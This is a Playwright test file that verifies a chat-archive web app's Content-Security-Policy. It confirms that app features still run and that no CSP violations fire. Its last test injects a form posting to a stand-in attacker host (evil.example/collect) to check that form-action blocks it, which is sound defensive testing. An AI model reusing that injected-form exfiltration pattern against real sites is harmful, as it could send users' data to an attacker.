const { test, expect } = require("@playwright/test");

// The jump-to-date step here once targeted 2024-01-01, which is before
// the sample's first message (2024-01-06) — indexForDate resolves that to
// index 0, exactly where the timeline already sits, so this step proved
// nothing about the jump itself (only the surrounding CSP checks). UTC keeps
// the landing date unambiguous across whatever timezone the runner is in.
test.use({ timezoneId: "UTC" });

// served-mode Content-Security-Policy (defense-in-depth). The app already
// escapes all archive content before it reaches innerHTML (esc() in src/app.js),
// but shipped no CSP — a future escaping regression would have no second line of
// defense. This spec proves the meta CSP added to index.html/setup.html:
//   (a) breaks NOTHING real — the theme-boot runs, Chart.js paints the Stats
//       charts, Fuse.js/the command palette work, same-origin media renders, all
//       under the strict `script-src 'self'`;
//   (b) is actually enforced, by asserting zero CSP violations on both pages.
// (The data:-URL pfp path — img-src 'self' data: — is exercised end-to-end under
// this same embedded CSP by tests/setup-prefill.spec.js, which saves + reloads a
// data-URL avatar; no need to re-prove it here.)

// Chromium logs a blocked resource as a console error AND fires a structured
// `securitypolicyviolation` DOM event. Capture both.
function trackConsoleCsp(page) {
  const violations = [];
  page.on("console", (m) => {
    const t = m.text();
    if (/content security policy/i.test(t) || /Refused to/.test(t)) violations.push(t);
  });
  page.on("pageerror", (e) => {
    if (/content security policy/i.test(e.message)) violations.push("pageerror: " + e.message);
  });
  return violations;
}

async function installCspEventCollector(page) {
  await page.addInitScript(() => {
    window.__cspEvents = [];
    document.addEventListener("securitypolicyviolation", (e) => {
      window.__cspEvents.push({ directive: e.violatedDirective, blocked: e.blockedURI, sample: (e.sample || "").slice(0, 120) });
    });
  });
}

async function assertNoCspViolations(page, consoleViolations) {
  const cspEvents = await page.evaluate(() => window.__cspEvents);
  expect(cspEvents, "securitypolicyviolation events fired:\n" + JSON.stringify(cspEvents, null, 2)).toEqual([]);
  expect(consoleViolations, "console CSP violation lines:\n" + consoleViolations.join("\n")).toEqual([]);
}

test.describe("served-mode CSP (index.html + setup.html)", () => {
  test.beforeEach(async ({ page }) => {
    await page.addInitScript(() => {
      localStorage.setItem("gca.onboarded", "1");
      localStorage.removeItem("gca.lastView");
    });
    await installCspEventCollector(page);
  });

  test("index.html: search, timeline, command palette, Stats charts — zero CSP violations, theme boot applied", async ({ page }) => {
    const consoleViolations = trackConsoleCsp(page);
    // If theme-boot were blocked by script-src, documentElement would keep its
    // hard-coded default ("lightsout") instead of this saved theme — so this
    // assertion doubles as proof the boot script ran under the CSP.
    await page.addInitScript(() => localStorage.setItem("gca.theme", "light"));

    await page.goto("/");
    await expect(page.locator("html")).toHaveAttribute("data-theme", "light");
    await expect(page.locator(".msg").first()).toBeVisible();

    // Search (default view): Fuse.js-backed filtering + escaped rendering.
    await expect(page.locator("#s-input")).toBeVisible();
    await page.locator("#s-input").fill("movie");
    await expect(page.locator("#s-meta")).toContainText(/message(s)? found/);
    await expect(page.locator(".bubble").first()).toContainText(/movie/i);
    await page.locator("#s-input").fill("");

    // Timeline.
    await page.locator('.nav-item[data-view="timeline"]').click();
    await expect(page.locator("#tl-list .msg").first()).toBeVisible();

    // Command palette (Ctrl/Cmd-K) — jump-to-date flow from smoke.spec.js.
    // 2024-01-20 lands on the first message of Jan 24 (index 10), so a
    // broken jump (always landing on index 0) would be caught here too.
    await page.keyboard.press("Control+K");
    await page.locator(".cmdk-input").fill("2024-01-20");
    await page.getByText("Jump to Jan 20, 2024").click();   // the row names the parsed day
    // See smoke.spec.js's identical jump assertion for why this checks
    // viewport position rather than the transient .flash class (which races
    // its own 1700ms removal timer in src/app.js).
    const jumpTarget = page.locator('#tl-list [data-idx="10"]');
    await expect(jumpTarget).toBeInViewport();
    await expect(jumpTarget).toContainText("yo did everyone see that");

    // Stats — Chart.js must construct + paint real <canvas> charts under this
    // script-src (no 'unsafe-eval' needed for Chart.js 4.x).
    await page.locator('.nav-item[data-view="stats"]').click();
    await expect(page.locator("#chart-months")).toBeVisible();
    await expect(page.locator("#chart-trends")).toBeVisible();
    const liveCharts = await page.evaluate(() => {
      const inst = window.Chart.instances;
      return inst instanceof Map ? inst.size : Object.keys(inst).length;
    });
    expect(liveCharts).toBeGreaterThan(0);

    await assertNoCspViolations(page, consoleViolations);
  });

  test("setup.html: zero CSP violations, theme boot applied", async ({ page }) => {
    const consoleViolations = trackConsoleCsp(page);
    await page.addInitScript(() => localStorage.setItem("gca.theme", "dim"));

    await page.goto("/setup.html");
    await expect(page.locator("html")).toHaveAttribute("data-theme", "dim");
    await expect(page.locator("#btn-build")).toBeVisible();
    await expect(page.locator("#src-group")).toBeVisible();

    await assertNoCspViolations(page, consoleViolations);
  });
});

// The meta CSP is enforced over file:// too (it is part of the page, not a
// header). There the optional data.js / local.js overrides are genuinely
// missing, so their <script> loads fail; inline onerror="…" attributes on those
// tags were blocked by script-src (no 'unsafe-inline'), adding one CSP error per
// tag on top of the expected not-found lines. A failed <script src> load is
// harmless without a handler, so the page must carry no inline handlers at all.
test("file:// index.html: zero CSP violations (the missing optional scripts only log not-found)", async ({ page }) => {
  const { pathToFileURL } = require("node:url");
  const path = require("node:path");
  await installCspEventCollector(page);
  await page.addInitScript(() => { try { localStorage.setItem("gca.onboarded", "1"); } catch (e) { /* storage blocked */ } });
  const consoleViolations = trackConsoleCsp(page);
  await page.goto(pathToFileURL(path.join(__dirname, "..", "index.html")).href);
  await expect(page.locator("#app")).toBeVisible();
  expect(await page.evaluate(() => window.CHAT_DATA && window.CHAT_DATA.__sample === true)).toBe(true);
  await expect(page.locator(".msg").first()).toBeVisible();
  await assertNoCspViolations(page, consoleViolations);
});

// A form is the one thing injected markup could still use under script-src
// 'self' (a fake "session expired" form posting elsewhere): the policy says
// no page here submits a form anywhere. The calendar's jump form is handled
// in script (its submit is cancelled), so it never navigates and isn't affected.
for (const page_ of ["/", "/setup.html"]) {
  test(page_ + ": a form posting to another site is blocked by form-action", async ({ page }) => {
    await installCspEventCollector(page);
    await page.route("https://evil.example/**", (route) => route.abort());   // never leaves the machine either way
    await page.addInitScript(() => { try { localStorage.setItem("gca.onboarded", "1"); } catch (e) { /* storage blocked */ } });
    await page.goto(page_);
    const before = page.url();
    await page.evaluate(() => {
      const f = document.createElement("form");
      f.action = "https://evil.example/collect"; f.method = "post";
      document.body.appendChild(f);
      f.submit();
    });
    await expect.poll(() => page.evaluate(() => window.__cspEvents.map((e) => e.directive))).toContain("form-action");
    expect(page.url()).toBe(before);
  });
}
